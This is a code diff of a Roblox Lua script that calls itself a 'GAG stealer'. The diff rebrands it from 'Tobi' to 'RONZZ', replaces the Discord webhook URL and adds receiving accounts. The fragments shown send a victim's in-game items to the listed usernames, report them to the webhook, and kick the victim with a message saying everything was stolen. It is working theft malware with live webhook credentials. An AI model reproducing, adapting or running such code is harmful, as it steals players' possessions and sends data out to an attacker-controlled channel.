@@ -1,7 +1,7 @@
-_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33"}
-_G.min_value = 100000000
-_G.pingEveryone = "Yes"
-_G.webhook = "https://discord.com/api/webhooks/1393589102821249074/rj931h6KfxS4KSeQ2RXKBxcuPgP-gLwqQn_IBA-CQoSt_XlT0HjkUjPHh9LrKAL2sk9o"
+_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55"} -- you can add as many as you'd like
+_G.min_value = 100000000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1397050931475906622/SfHsX5ToYLywNh3gUVM2W2XmaMPumldSwB6ttvkAX6QWFU3YP6VInlIaPJIsv-hure37" 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -174,7 +174,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "GAG stealer by RONZZ. discord.gg/GY2RVSEGDT"
             }
         }}
     }
@@ -233,7 +233,7 @@ local function SendMessage(sortedItems)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "GAG stealer by RONZZ. discord.gg/GY2RVSEGDT"
 			}
         }}
     }
@@ -349,7 +349,7 @@ if #itemsToSend > 0 then
             task.wait(0.1)
         end
 
-        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
+        plr:kick("All your stuff just got stolen by RONZZ stealer!\n Join discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserChat()
@@ -369,4 +369,4 @@ if #itemsToSend > 0 then
         Players.PlayerAdded:Connect(onPlayerChat)
     end
     waitForUserChat()
-end 
+end
